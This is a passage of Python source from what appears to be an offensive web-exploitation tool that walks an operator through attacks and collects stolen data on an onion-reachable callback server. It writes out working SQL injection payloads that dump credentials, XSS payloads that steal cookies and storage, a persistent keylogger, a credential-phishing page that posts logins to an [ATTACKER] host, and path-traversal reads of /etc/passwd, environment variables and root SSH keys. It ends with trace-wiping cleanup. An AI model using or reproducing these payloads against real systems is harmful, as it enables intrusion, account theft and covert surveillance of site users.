            key = parts[0].strip().lower().replace(" ", "_")[:30]
            val = parts[1].strip()[:100]
            if key and val and not any(c in key for c in "/<>{}"):
                chain_data[f"extracted_{key}"] = val


def _show_tracked_files(file_mgr: ExploitFileManager):
    """Display currently tracked ephemeral files."""
    files = file_mgr.list_files()
    if not files:
        info("No files currently tracked.")
        return
    print(f"\n  {B}Tracked Ephemeral Files:{N}")
    print(f"  {'─' * 55}")
    for f in files:
        status = f"{G}active{N}" if f["exists"] else f"{R}wiped{N}"
        ttl_str = (f"{f['ttl_remaining']}s left"
                   if isinstance(f["ttl_remaining"], int) else "persistent")
        print(f"  {f['filename']:30s}  {f['type']:12s}  "
              f"{f['size_bytes']:>5d}B  {status}  {ttl_str}")
    print()


def _show_captures(server: ExploitServer):
    """Display captured callback data from exploit server."""
    if not server.is_running:
        info("Exploit server not running.")
        return
    captures = server.get_captures(last_n=30)
    base_url = server.get_attacker_url(prefer_onion=True)
    if not captures:
        info("No callbacks captured yet.")
        if base_url:
            info(f"Attacker base: {base_url}")
        info(f"Token-authed endpoints: /c/<tok> /x/<tok> /k/<tok> "
             f"/s/<tok> /b/<tok>")
        info("  /c=credentials  /x=exfil  /k=keylog  /s=session  /b=beacon")
        return
    print(f"\n  {B}Captured Callbacks ({len(captures)}){N}"
          f"  — total: {server.capture_count()}")
    print(f"  {'─' * 72}")
    _kind_color = {
        "credentials": R, "keylog": Y, "exfil": M, "session": R,
        "beacon": C, "unknown": D,
    }
    for i, cap in enumerate(captures, 1):
        kind = cap.get("kind", "unknown")
        ep_color = _kind_color.get(kind, D)
        remote = cap.get("remote", "")
        remote_tag = f" {D}from {remote}{N}" if remote else ""
        print(f"  {i:>3}. [{cap['time']}] {ep_color}{cap['method']:4s} "
              f"{cap['endpoint']:3s} {kind:11s}{N}{remote_tag}")
        ua = cap.get("ua", "")
        ref = cap.get("referer", "")
        if ua:
            print(f"       {D}UA:{N} {ua[:90]}")
        if ref:
            print(f"       {D}Ref:{N} {ref[:90]}")
        if cap["query"]:
            print(f"       {D}Query:{N} {cap['query'][:120]}")
        if cap["data"]:
            data_preview = cap["data"][:240].replace("\n", "\\n")
            print(f"       {G}Data:{N} {data_preview}")
            if len(cap["data"]) > 240:
                print(f"       {D}... ({len(cap['data'])} bytes total){N}")
    print()


def _show_live_audit(audit: AuditTrail):
    """Display recent audit trail entries."""
    entries = audit.get_live_feed(last_n=15)
    stats = audit.get_stats()
    if not entries:
        info("No audit entries yet.")
        return
    print(f"\n  {B}Live Audit Feed{N} (session: {stats['session_id']})")
    print(f"  {D}Duration: {stats['duration_seconds']}s | "
          f"Executions: {stats['executions']} | "
          f"Alerts: {stats['alerts']}{N}")
    print(f"  {'─' * 60}")
    for e in entries:
        risk_tag = ""
        if e.get("risk") in ("HIGH", "CRITICAL"):
            risk_tag = f" {R}[{e['risk']}]{N}"
        elif e.get("risk"):
            risk_tag = f" {Y}[{e['risk']}]{N}"
        status = ""
        if e.get("success") is True:
            status = f" {G}OK{N}"
        elif e.get("success") is False:
            status = f" {R}FAIL{N}"
        print(f"  [{e['ts_iso']}] {e['action']:14s}{risk_tag} "
              f"{e.get('detail', '')[:40]}{status}")
    print()


def _walkthrough_session_end(file_mgr: ExploitFileManager,
                             audit: AuditTrail,
                             executor,
                             findings_summary: list,
                             server: ExploitServer = None):
    """End-of-session: show stats, offer report, then wipe everything."""
    print()
    heading("Session Complete")
    stats = audit.get_stats()
    print(f"  {B}Session ID:{N}      {stats['session_id']}")
    print(f"  {B}Duration:{N}        {stats['duration_seconds']}s")
    print(f"  {B}Commands run:{N}    {stats['executions']} "
          f"({stats['successes']} ok, {stats['failures']} fail)")
    print(f"  {B}Steps skipped:{N}   {stats['skips']}")
    print(f"  {B}Files generated:{N} {stats['files_generated']}")
    print(f"  {B}Custom commands:{N} {stats['edits']}")
    print(f"  {B}High-risk alerts:{N} {stats['alerts']}")
    print(f"  {B}Vuln types:{N}      {', '.join(stats['vuln_types_tested'])}")
    if server and server.is_running:
        base = server.get_attacker_url(prefer_onion=True)
        print(f"  {B}Attacker infra:{N}  {base}")
        if server.onion_host:
            print(f"  {B}Local mirror:{N}   http://127.0.0.1:{server.port}")
        cap_count = server.capture_count()
        if cap_count:
            print(f"  {B}Callbacks captured:{N} {R}{cap_count}{N}")
    print()

    # Show generated files summary
    tracked = file_mgr.list_files()
    if tracked:
        active = [f for f in tracked if f["exists"]]
        if active:
            print(f"  {B}Generated Exploit Files ({len(active)}):{N}")
            for f in active:
                serve_info = ""
                if server and server.is_running:
                    serve_info = f"  {D}→ {server.get_url(f['filename'])}{N}"
                print(f"    {G}●{N} {f['filename']:30s} {f['type']:12s} "
                      f"{f['size_bytes']:>5d}B{serve_info}")
            print()

    alerts = audit.get_alerts()
    if alerts:
        print(f"  {R}High-Risk Alerts:{N}")
        for a in alerts[:5]:
            print(f"    [{a['ts_iso']}] {a['action']}: {a.get('detail', '')[:50]}")
        print()

    # Show any captured callbacks before cleanup
    if server and server.is_running and server.capture_count() > 0:
        print(f"  {R}Captured Data ({server.capture_count()} callbacks):{N}")
        _kc = {"credentials": R, "keylog": Y, "exfil": M,
               "session": R, "beacon": C}
        for cap in server.get_captures(last_n=10):
            ep_color = _kc.get(cap.get("kind", ""), D)
            print(f"    [{cap['time']}] {ep_color}{cap['method']} "
                  f"{cap['endpoint']}{N}: {cap['data'][:80] or cap['query'][:80]}")
        print()

    if confirm("Generate session report?"):
        fmt = prompt("Format (text/json)", "text").lower()
        if fmt not in ("text", "json"):
            fmt = "text"
        report_content = ReportGenerator.generate(
            audit, file_mgr, fmt=fmt,
            findings_summary=findings_summary,
            server=server,
        )
        report_path = ReportGenerator.save_report(
            report_content, file_mgr, fmt=fmt,
        )
        ok(f"Report saved: {report_path.name} (ephemeral, auto-wipes)")
        print()

        if confirm("Display report now?"):
            print()
            print(report_content)
            print()

    # Cleanup handled by the outer try/finally in _intel_exploit_walkthrough


def _walkthrough_cleanup(file_mgr: ExploitFileManager,
                         audit: AuditTrail,
                         executor=None,
                         server: ExploitServer = None):
    """Securely destroy all session data — files, server, audit, memory."""
    print()
    if server and server.is_running:
        info("Stopping exploit server...")
        server.stop()
        ok("Exploit server stopped")

    tracked = file_mgr.list_files()
    if tracked:
        active = [f for f in tracked if f["exists"]]
        if active:
            info(f"Wiping {len(active)} ephemeral file(s)...")
            wiped = file_mgr.wipe_all()
            ok(f"Securely wiped {wiped} file(s)")

    audit.log("session_destroy", "full_cleanup")
    audit.session_destroy()
    file_mgr.session_destroy()
    ok("Session data destroyed — no traces remain in memory.")
    info("Run Intel mode 7 (Wipe Intel Data) to erase scan results and reports.")


def _build_exploit_steps(etype: str, param: str, ei: dict,
                         test_url: str, base_url: str, sp: str) -> list:
    """Build exploit steps as structured request dicts with validation.

    Each step has:
    - title, note, warning, risk (display)
    - request: {method, url, params, data, headers} (execution)
    - validate: callable(ExploitResult) that sets success/confidence/evidence
    - generate_file: {filename, content, note} (file generation)
    - OR command: str (legacy shell command for edge cases only)

    Validation callbacks analyze the response and set structured results.
    """
    target = test_url if test_url and test_url != "[TARGET]" else base_url
    path = ei.get("path", "")
    target_base = target.split("?")[0] if "?" in target else target

    import re as _re

    def _get(url: str, extra_params: dict = None, extra_headers: dict = None,
             allow_redirects: bool = True) -> dict:
        """Build a GET request dict."""
        r = {"method": "GET", "url": url, "allow_redirects": allow_redirects}
        if extra_params:
            r["params"] = extra_params
        if extra_headers:
            r["headers"] = extra_headers
        return r

    def _get_param(val: str, allow_redirects: bool = True) -> dict:
        """Build GET to target_base with param=val."""
        return _get(target_base, extra_params={param: val},
                    allow_redirects=allow_redirects)

    def _post(url: str, data: dict = None, extra_headers: dict = None) -> dict:
        r = {"method": "POST", "url": url}
        if data:
            r["data"] = urlencode(data)
            r["headers"] = {"Content-Type": "application/x-www-form-urlencoded"}
            if extra_headers:
                r["headers"].update(extra_headers)
        elif extra_headers:
            r["headers"] = extra_headers
        return r

    _SQL_ERRORS = _re.compile(
        r"(SQL syntax|mysql_fetch|ORA-\d|SQLSTATE|sqlite3\.|"
        r"pg_query|Unclosed quotation|quoted string not properly terminated|"
        r"error in your SQL|syntax error at or near|"
        r"Microsoft OLE DB|ODBC SQL Server Driver)", _re.I)

    steps = []

    if etype == "sqli":
        # Per-session unique markers so UNION extraction results are
        # distinguishable from incidental substrings on the target.
        _sqli_marker = secrets.token_hex(4)
        _sqli_union_sep = secrets.token_hex(3)  # e.g. 'ab9d4f'

        def _sqli_error_check(r: ExploitResult):
            if _SQL_ERRORS.search(r.response_body):
                r.success = True
                r.confidence = 0.85
                r.evidence = "SQL error message in response"
                r.false_positive_risk = "low"
            elif r.status_code == 500:
                r.confidence = 0.3
                r.evidence = "HTTP 500 — possible SQL error (no error string matched)"
                r.false_positive_risk = "medium"

        def _sqli_data_check(r: ExploitResult):
            """Evidence must be *structural* — not just any colon."""
            body = r.response_body
            # Passwd line (from LOAD_FILE style extraction)
            if _re.search(r"^[A-Za-z0-9_.-]+:[x*!]?:\d+:\d+:", body, _re.M):
                r.success = True
                r.confidence = 0.95
                r.evidence = "/etc/passwd row extracted via UNION"
                r.false_positive_risk = "very_low"
                return
            # information_schema keywords as standalone tokens
            if _re.search(r"\binformation_schema\b", body):
                r.success = True
                r.confidence = 0.9
                r.evidence = "information_schema reference in response"
                r.false_positive_risk = "low"
                return
            # username:hash patterns (bcrypt / md5 / sha256 common shapes)
            if _re.search(r"\b[A-Za-z0-9._-]{3,32}:\$(2[aby]|6|5|1)\$", body):
                r.success = True
                r.confidence = 0.9
                r.evidence = "username:hash pattern extracted"
                r.false_positive_risk = "low"
                return
            if _re.search(r"\b[A-Za-z0-9._-]{3,32}:[0-9a-f]{32,128}\b", body):
                r.success = True
                r.confidence = 0.85
                r.evidence = "username:hexhash pattern extracted"
                r.false_positive_risk = "low"
                return
            # Our per-session UNION marker
            if _sqli_marker in body or _sqli_union_sep in body:
                r.success = True
                r.confidence = 0.95
                r.evidence = f"Marker {_sqli_marker} reflected from UNION output"
                r.false_positive_risk = "very_low"
                return
            # DB version strings
            if _re.search(
                r"\b(MySQL|MariaDB|PostgreSQL|SQLite|Microsoft SQL Server)\s+"
                r"[\d.]+", body):
                r.success = True
                r.confidence = 0.85
                r.evidence = "DB version string in response"
                r.false_positive_risk = "low"
                return
            # Not enough to mark success — rank accordingly.
            if r.status_code == 200 and len(body) > 50:
                r.confidence = 0.25
                r.evidence = "HTTP 200 with body but no SQLi evidence"
                r.false_positive_risk = "high"

        # Baseline + per-pair compare for boolean-blind. Closure holds the
        # TRUE/FALSE sizes so a later step can conclude from the delta.
        _blind_state = {"true_len": None, "false_len": None, "base_len": None}

        def _sqli_baseline_check(r: ExploitResult):
            _blind_state["base_len"] = len(r.response_body)
            r.evidence = (f"Baseline: HTTP {r.status_code}, "
                          f"{len(r.response_body)} bytes")

        def _sqli_blind_true(r: ExploitResult):
            _blind_state["true_len"] = len(r.response_body)
            r.evidence = (f"TRUE branch: HTTP {r.status_code}, "
                          f"{len(r.response_body)} bytes")

        def _sqli_blind_false(r: ExploitResult):
            _blind_state["false_len"] = len(r.response_body)
            false_len = _blind_state["false_len"]
            true_len = _blind_state["true_len"]
            base_len = _blind_state["base_len"]
            r.evidence = (f"FALSE branch: HTTP {r.status_code}, "
                          f"{false_len} bytes")
            if true_len is None or false_len is None:
                return
            delta = abs(true_len - false_len)
            if delta >= 16 and (base_len is None or
                                abs(true_len - base_len) < delta * 2 or
                                abs(false_len - base_len) < delta * 2):
                r.success = True
                r.confidence = 0.85
                r.evidence = (f"Boolean-blind confirmed: TRUE={true_len}, "
                              f"FALSE={false_len}, delta={delta}")
                r.false_positive_risk = "low"
            else:
                r.evidence += f" — TRUE={true_len}, delta={delta} (too small)"

        def _sqli_time_check(r: ExploitResult):
            """Use measured request duration from TorClient.elapsed."""
            elapsed = getattr(r, "elapsed", 0.0)
            r.evidence = f"Request took {elapsed:.2f}s"
            # SLEEP(5) payload: require the response to be at least 4.0s
            # slower than a typical baseline of <1s. Very conservative.
            if elapsed >= 4.0:
                r.success = True
                r.confidence = 0.9 if elapsed >= 4.5 else 0.7
                r.evidence = (f"Time-based blind confirmed: request took "
                              f"{elapsed:.2f}s (SLEEP(5) payload)")
                r.false_positive_risk = "low" if elapsed >= 4.5 else "medium"
            elif elapsed >= 2.0:
                r.confidence = 0.4
                r.evidence += " — partial delay, re-run or try SLEEP(10)"
                r.false_positive_risk = "medium"

        steps = [
            # Re-confirm with the finding's exact vuln URL so we don't
            # miss the injection point when target_base differs from the
            # original scanner finding.
            {"title": "Confirm injection (error-based)",
             "request": _get_param("'"),
             "validate": _sqli_error_check,
             "note": "Single-quote probe on the original parameter"},
            {"title": "Confirm injection (double-quote)",
             "request": _get_param('"'),
             "validate": _sqli_error_check,
             "note": "Double-quote probe for contexts that escape single quotes"},
            # Baseline for blind comparison
            {"title": "Capture boolean-blind baseline",
             "request": _get_param("1"),
             "validate": _sqli_baseline_check,
             "note": "Baseline length for boolean comparison"},
            {"title": "Extract DB version (MySQL/Maria)",
             "request": _get_param(
                 f"' UNION SELECT concat('{_sqli_marker}',version(),"
                 f"'{_sqli_union_sep}')-- -"),
             "validate": _sqli_data_check,
             "note": "Per-session marker distinguishes extracted from incidental"},
            {"title": "Extract DB version (PostgreSQL)",
             "request": _get_param(
                 f"' UNION SELECT '{_sqli_marker}'||version()||"
                 f"'{_sqli_union_sep}'-- -"),
             "validate": _sqli_data_check,
             "note": "PostgreSQL uses || for string concatenation"},
            {"title": "Extract DB version (SQLite)",
             "request": _get_param(
                 f"' UNION SELECT '{_sqli_marker}'||sqlite_version()||"
                 f"'{_sqli_union_sep}'-- -"),
             "validate": _sqli_data_check,
             "note": "SQLite version extraction"},
            {"title": "Enumerate databases (MySQL/PG)",
             "request": _get_param(
                 f"' UNION SELECT concat('{_sqli_marker}',"
                 f"group_concat(schema_name),'{_sqli_union_sep}') "
                 f"FROM information_schema.schemata-- -"),
             "validate": _sqli_data_check,
             "warning": "Reads all database names"},
            {"title": "Enumerate tables (current DB)",
             "request": _get_param(
                 f"' UNION SELECT concat('{_sqli_marker}',"
                 f"group_concat(table_name),'{_sqli_union_sep}') "
                 f"FROM information_schema.tables WHERE "
                 f"table_schema=database()-- -"),
             "validate": _sqli_data_check,
             "warning": "Lists tables in current database"},
            {"title": "Enumerate columns (users table)",
             "request": _get_param(
                 f"' UNION SELECT concat('{_sqli_marker}',"
                 f"group_concat(column_name),'{_sqli_union_sep}') "
                 f"FROM information_schema.columns WHERE "
                 f"table_name='users'-- -"),
             "validate": _sqli_data_check,
             "warning": "Maps user table structure"},
            {"title": "Dump credentials",
             "request": _get_param(
                 f"' UNION SELECT concat('{_sqli_marker}',"
                 f"group_concat(username,0x3a,password),"
                 f"'{_sqli_union_sep}') FROM users-- -"),
             "validate": _sqli_data_check,
             "warning": "Extracts username:password pairs",
             "risk": "HIGH"},
            # Boolean-blind pair
            {"title": "Boolean-blind test (TRUE)",
             "request": _get_param("' AND 1=1-- -"),
             "validate": _sqli_blind_true,
             "note": "Captures TRUE response size for comparison"},
            {"title": "Boolean-blind test (FALSE)",
             "request": _get_param("' AND 1=2-- -"),
             "validate": _sqli_blind_false,
             "note": "Concludes blind SQLi if TRUE/FALSE sizes differ"},
            # Time-based — now actually measured via ExploitResult.elapsed
            {"title": "Time-based blind (MySQL SLEEP 5)",
             "request": _get_param("' AND SLEEP(5)-- -"),
             "validate": _sqli_time_check,
             "note": "Measured response time — MySQL/MariaDB"},
            {"title": "Time-based blind (PG pg_sleep 5)",
             "request": _get_param("'; SELECT pg_sleep(5)-- -"),
             "validate": _sqli_time_check,
             "note": "Measured response time — PostgreSQL"},
            {"title": "Time-based blind (MSSQL WAITFOR 5)",
             "request": _get_param("'; WAITFOR DELAY '0:0:5'-- -"),
             "validate": _sqli_time_check,
             "note": "Measured response time — SQL Server"},
        ]

    elif etype == "xss":
        marker = f"x{secrets.token_hex(4)}"
        xss_phish_html = (
            f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
            f"<title>Session Expired</title>"
            f"<style>"
            f"*{{margin:0;padding:0;box-sizing:border-box}}"
            f"body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;"
            f"background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}}"
            f".card{{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),"
            f"0 8px 16px rgba(0,0,0,.1);padding:20px;width:396px}}"
            f"h2{{font-size:20px;margin-bottom:16px;color:#1c1e21}}"
            f"input{{width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;"
            f"border-radius:6px;font-size:17px}}"
            f"button{{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;"
            f"border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-top:12px}}"
            f"button:hover{{background:#166fe5}}"
            f".sub{{text-align:center;margin-top:16px;color:#606770;font-size:14px}}"
            f"</style></head><body>"
            f"<div class='card'>"
            f"<h2>Your session has expired</h2>"
            f"<p style='color:#606770;margin-bottom:16px'>Please log in again to continue.</p>"
            f"<form id='pf'>"
            f"<input name='email' placeholder='Email or phone number' autocomplete='off'/>"
            f"<input name='pass' type='password' placeholder='Password' autocomplete='off'/>"
            f"<button type='submit'>Log In</button>"
            f"</form>"
            f"<div class='sub'>Secured connection</div>"
            f"</div>"
            f"<script>"
            f"document.getElementById('pf').addEventListener('submit',function(e){{"
            f"e.preventDefault();"
            f"var d=new FormData(this);"
            f"var p={{email:d.get('email'),pass:d.get('pass'),"
            f"url:location.href,ref:document.referrer,"
            f"cookies:document.cookie,"
            f"ua:navigator.userAgent,"
            f"tz:Intl.DateTimeFormat().resolvedOptions().timeZone}};"
            f"var body=JSON.stringify(p);"
            f"fetch('[ATTACKER]/c',{{method:'POST',"
            f"headers:{{'Content-Type':'application/json'}},"
            f"credentials:'include',body:body,keepalive:true}})"
            f".catch(function(){{"
            f"  new Image().src='[ATTACKER]/c?d='+encodeURIComponent(body).slice(0,1500);"
            f"}})"
            f".finally(function(){{location.href='{base_url}';}});"
            f"}});"
            f"</script></body></html>"
        )

        def _xss_reflect_check(marker_str: str, context_needed: str = ""):
            """Check reflection of a UNIQUE per-step marker.

            marker_str:      the session-unique token that MUST appear
                             verbatim in the response body.
            context_needed:  optional substring that must also be present
                             (e.g. 'onerror=' to confirm the payload
                             landed in an HTML-attribute context rather
                             than as text).
            """
            def _check(r: ExploitResult):
                body = r.response_body
                if marker_str not in body:
                    if r.status_code == 200:
                        r.confidence = 0.1
                        r.evidence = (f"Marker {marker_str} NOT reflected "
                                      f"(HTTP 200)")
                        r.false_positive_risk = "very_low"
                    else:
                        r.evidence = (f"Marker not reflected, HTTP "
                                      f"{r.status_code}")
                    return
                # Marker present — now check execution context. We only
                # count unescaped reflection. If the marker appears but
                # its surrounding < > are HTML-entity-escaped, the app
                # is safe here.
                idx = body.find(marker_str)
                # Look 40 bytes around for escape indicators
                window = body[max(0, idx - 40):idx + len(marker_str) + 40]
                # Find the nearest < before the marker
                escaped = ("&lt;" in window and "<" not in
                           window[:window.index("&lt;") + 1])
                if context_needed and context_needed not in window:
                    r.confidence = 0.4
                    r.evidence = (f"Marker reflected but expected context "
                                  f"'{context_needed}' missing within 40 "
                                  f"bytes — likely text-node only")
                    r.false_positive_risk = "medium"
                    return
                if escaped:
                    r.confidence = 0.3
                    r.evidence = ("Marker reflected but surrounded by "
                                  "entity-encoded < — app appears safe here")
                    r.false_positive_risk = "low"
                    return
                r.success = True
                r.confidence = 0.95
                r.evidence = (f"Payload reflected unescaped (marker "
                              f"{marker_str})")
                r.false_positive_risk = "very_low"
            return _check

        # Per-step unique markers — no false-positive substring match.
        _m_script = f"x{secrets.token_hex(4)}"
        _m_img = f"i{secrets.token_hex(4)}"
        _m_svg = f"s{secrets.token_hex(4)}"
        _m_attr = f"a{secrets.token_hex(4)}"
        _m_js_ctx = f"j{secrets.token_hex(4)}"
        _m_steal = f"k{secrets.token_hex(4)}"

        steps = [
            {"title": "Check reflection (benign marker)",
             "request": _get_param(marker),
             "validate": _xss_reflect_check(marker),
             "note": f"Benign marker {marker} — confirms input reaches output"},
            {"title": "Test <script> tag",
             "request": _get_param(f"<script>/*{_m_script}*/</script>"),
             "validate": _xss_reflect_check(_m_script, "<script"),
             "note": "Executes if marker is between <script> tags unescaped"},
            {"title": "Test img onerror (filter bypass)",
             "request": _get_param(f"<img src=x onerror=\"/*{_m_img}*/\">"),
             "validate": _xss_reflect_check(_m_img, "onerror"),
             "note": "Bypasses script-tag filters"},
            {"title": "Test svg/onload",
             "request": _get_param(f"<svg/onload=\"/*{_m_svg}*/\">"),
             "validate": _xss_reflect_check(_m_svg, "onload"),
             "note": "Bypasses img and script filters"},
            {"title": "Test attribute injection (breakout)",
             "request": _get_param(
                 f"\" autofocus onfocus=\"/*{_m_attr}*/\" x=\""),
             "validate": _xss_reflect_check(_m_attr, "onfocus"),
             "note": "No angle brackets — bypasses most WAFs"},
            {"title": "Test JavaScript-string context breakout",
             "request": _get_param(f"';/*{_m_js_ctx}*/'"),
             "validate": _xss_reflect_check(_m_js_ctx),
             "note": "If the param is reflected inside a JS string, ' breaks out"},
            {"title": "Cookie exfiltration payload",
             # Per-step unique marker embedded as a JS comment inside the
             # payload. Previously validated on the generic phrase
             # 'new Image', which appears in legitimate JavaScript on
             # plenty of target pages and produced false positives. The
             # marker is alphanumeric-only so it survives JS parsers
             # unchanged when reflected.
             "request": _get_param(
                 f"<script>/*{_m_steal}*/new Image().src='[ATTACKER]/c?c='"
                 "+encodeURIComponent(document.cookie)"
                 "+'&u='+encodeURIComponent(location.href)"
                 "+'&r='+encodeURIComponent(document.referrer)</script>"),
             "validate": _xss_reflect_check(_m_steal, "<script"),
             "warning": "Steals session cookies",
             "risk": "HIGH"},
            {"title": "Generate credential phishing page",
             "generate_file": {
                 "filename": f"xss_phish_{secrets.token_hex(3)}.html",
                 "content": xss_phish_html,
                 "note": "Functional phishing page — captures credentials via POST.",
             }},
        ]

    elif etype == "stored_xss":
        render = ei.get("render_path", "/")
        # Stored XSS has TWO paths: the INJECT endpoint (where we POST
        # the payload) and the RENDER endpoint (where victims see it).
        # The scanner sets finding.test_url to the render URL so the
        # report's replay link points at the visible result — but the
        # walkthrough needs to POST at the inject endpoint, or every
        # payload lands on the render page where no form handler
        # exists. Reconstruct inject_url from base_url + exploit_info.path.
        inject_path = ei.get("path", "")
        if inject_path:
            inject_url = base_url.rstrip("/") + inject_path
        else:
            inject_url = target
        def _sxss_verify(r: ExploitResult):
            if "<script>" in r.response_body.lower() or "onerror=" in r.response_body.lower():
                r.success = True
                r.confidence = 0.85
                r.evidence = "Script tag found in rendered page"
                r.false_positive_risk = "low"
        # Stored XSS payloads — tokenised callbacks + victim context (URL,
        # UA, referrer, storage) so the operator can attribute every capture.
        _cookie_steal = (
            "<script>new Image().src='[ATTACKER]/c?c='"
            "+encodeURIComponent(document.cookie)"
            "+'&u='+encodeURIComponent(location.href)"
            "+'&r='+encodeURIComponent(document.referrer)</script>"
        )
        _keylog = (
            "<script>(function(){var q=[];document.onkeypress=function(e){"
            "q.push(e.key);if(q.length>=16){"
            "new Image().src='[ATTACKER]/k?k='+encodeURIComponent(q.join(''));"
            "q=[];}};setInterval(function(){if(q.length){"
            "new Image().src='[ATTACKER]/k?k='+encodeURIComponent(q.join(''));"
            "q=[];}},5000);})();</script>"
        )
        _storage_dump = (
            "<script>(function(){var d={c:document.cookie,u:location.href,"
            "ls:JSON.stringify(localStorage),"
            "ss:JSON.stringify(sessionStorage)};"
            "fetch('[ATTACKER]/s',{method:'POST',credentials:'include',"
            "keepalive:true,headers:{'Content-Type':'application/json'},"
            "body:JSON.stringify(d)}).catch(function(){});})();</script>"
        )
        _beacon = (
            "<script>fetch('[ATTACKER]/b?u='"
            "+encodeURIComponent(location.href))"
            ".catch(function(){});</script>"
        )
        steps = [
            {"title": "Beacon (confirm render without stealing)",
             "request": _post(inject_url, {param: _beacon}),
             "note": f"Harmless ping — POSTs to {inject_path or '(origin)'} "
                     "so you can confirm the XSS fires at "
                     f"{render} before pushing sensitive payloads.",
             "validate": lambda r: setattr(
                 r, 'evidence', f"POST returned HTTP {r.status_code}")},
            {"title": "Inject persistent cookie-stealing payload",
             "request": _post(inject_url, {param: _cookie_steal}),
             "warning": "Injects a persistent payload",
             "validate": lambda r: setattr(
                 r, 'evidence', f"POST returned HTTP {r.status_code}")},
            {"title": "Inject persistent keylogger payload",
             "request": _post(inject_url, {param: _keylog}),
             "warning": "Injects persistent keylogger (buffers + batches keys)",
             "risk": "CRITICAL"},
            {"title": "Inject storage exfiltration payload",
             "request": _post(inject_url, {param: _storage_dump}),
             "warning": "Dumps cookies + localStorage + sessionStorage to /s",
             "risk": "CRITICAL"},
            {"title": "Verify payload renders",
             "request": _get(base_url.rstrip("/") + render),
             "validate": _sxss_verify,
             "note": f"Fetches {render} to confirm the injected script appears"},
        ]

    elif etype == "lfi":
        # /etc/passwd shape: `^user:[x*!]?:\d+:\d+:...` appearing as a
        # line. Require a regex match, not just substring — a blog post
        # that mentions the string "root:" wouldn't match the line shape.
        _passwd_row = _re.compile(
            r"^[A-Za-z0-9_.-]+:[x*!]?:\d+:\d+:", _re.M
        )
        # Config-file heuristics: only trigger when the keyword appears
        # in a KEY=VALUE or KEY: VALUE shape with a value. A page that
        # mentions the word 'password' in prose doesn't match.
        _config_like = _re.compile(
            r"(?mi)^\s*(?:DB_PASSWORD|DB_HOST|DB_USER|API_KEY|SECRET|"
            r"ACCESS_KEY_ID|AWS_SECRET|REDIS_PASSWORD|MYSQL_PASSWORD)"
            r"\s*[:=]\s*\S"
        )

        def _lfi_check(r: ExploitResult):
            body = r.response_body
            if _passwd_row.search(body):
                r.success = True
                r.confidence = 0.95
                r.evidence = "Unix /etc/passwd row detected"
                r.false_positive_risk = "very_low"
                return
            if "BEGIN RSA PRIVATE KEY" in body or "BEGIN OPENSSH PRIVATE KEY" in body:
                r.success = True
                r.confidence = 0.95
                r.evidence = "SSH private key content detected"
                r.false_positive_risk = "very_low"
                return
            if r.status_code == 200 and len(body) > 20:
                if _config_like.search(body):
                    r.success = True
                    r.confidence = 0.75
                    r.evidence = "Config-file KEY=VALUE entries detected"
                    r.false_positive_risk = "medium"

        # Adaptive traversal depths
        _traversals = ["../" * d for d in (3, 5, 7, 10)]
        steps = [
            {"title": "Confirm initial LFI",
             "request": _get(target),
             "validate": _lfi_check,
             "note": "Check if the original finding URL returns file content"},
        ]
        for depth, trav in enumerate(_traversals):
            steps.append({
                "title": f"Read /etc/passwd (depth {len(trav)//3})",
                "request": _get_param(trav + "etc/passwd"),
                "validate": _lfi_check,
                "note": f"Traversal depth: {len(trav)//3} directories",
            })
        steps.extend([
            {"title": "Read /proc/self/environ",
             "request": _get_param("/proc/self/environ"),
             "validate": _lfi_check,
             "warning": "Reads process environment variables"},
            {"title": "PHP filter (base64 source read)",
             "request": _get_param("php://filter/convert.base64-encode/resource=index.php"),
             "validate": lambda r: setattr(r, 'evidence', 'Check for base64 data in response'),
             "note": "Decodes to PHP source code"},
            {"title": "Read SSH private key",
             "request": _get_param("../../../../../../root/.ssh/id_rsa"),
             "validate": _lfi_check,
             "warning": "Reads server SSH key",
             "risk": "CRITICAL"},
            {"title": "Null byte bypass",
             "request": _get_param("../../../../../../etc/passwd%00"),
             "validate": _lfi_check,
             "note": "Terminates appended extensions (legacy PHP)"},
            {"title": "Double encoding bypass",
             "request": _get_param("%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
             "validate": _lfi_check,
             "note": "Bypasses single-decode WAF filters"},
            {"title": "Windows path fallback",
             "request": _get_param("..\\..\\..\\..\\..\\..\\windows\\win.ini"),
             "validate": lambda r: (
                 setattr(r, 'success', "[fonts]" in r.response_body) or
                 setattr(r, 'evidence', "Windows win.ini content" if "[fonts]" in r.response_body else "Not Windows")
             ),
             "note": "Detects Windows targets via win.ini"},
        ])

    elif etype == "command_injection":
        # Determine injection method from scan finding
        _cmdi_method = ei.get("method", "GET").upper()
        _cmdi_path = ei.get("path", "")

        # Baseline response for differential comparison
        _baseline_len = [0]  # mutable container for closure

        def _cmdi_check(r: ExploitResult):
            """Detect command execution evidence in response."""
            body = r.response_body
            # Strong indicators — command output present
            uid_match = _re.search(r"uid=(\d+)\((\w+)\)", body)
            if uid_match:
                r.success = True
                r.confidence = 0.97
                r.evidence = f"Command executed: uid={uid_match.group(1)}({uid_match.group(2)})"
                r.false_positive_risk = "very_low"
                return
            if _re.search(r"uid=\d+", body):
                r.success = True
                r.confidence = 0.95
                r.evidence = "uid= pattern found — command execution confirmed"
                r.false_positive_risk = "very_low"
                return
            # /etc/passwd content
            if "root:" in body and ":0:" in body and "/bin" in body:
                r.success = True
                r.confidence = 0.93
                r.evidence = "/etc/passwd content detected (root entry with shell)"
                r.false_positive_risk = "very_low"
                return
            # Linux version string from uname
            uname_m = _re.search(r"Linux\s+\S+\s+\d+\.\d+\.\d+", body)
            if uname_m:
                r.success = True
                r.confidence = 0.9
                r.evidence = f"uname output: {uname_m.group(0)[:60]}"
                r.false_positive_risk = "low"
                return
            # Windows indicators from systeminfo/ver
            if _re.search(r"Microsoft Windows|Windows NT|WINDOWS\\", body):
                r.success = True
                r.confidence = 0.85
                r.evidence = "Windows OS string detected in response"
                r.false_positive_risk = "low"
                return
            # Differential: response significantly different from baseline
            if _baseline_len[0] > 0:
                diff = abs(len(body) - _baseline_len[0])
                ratio = diff / max(_baseline_len[0], 1)
                if ratio > 0.3 and len(body) > 50:
                    r.confidence = 0.4
                    r.evidence = (f"Response size changed: baseline={_baseline_len[0]}, "
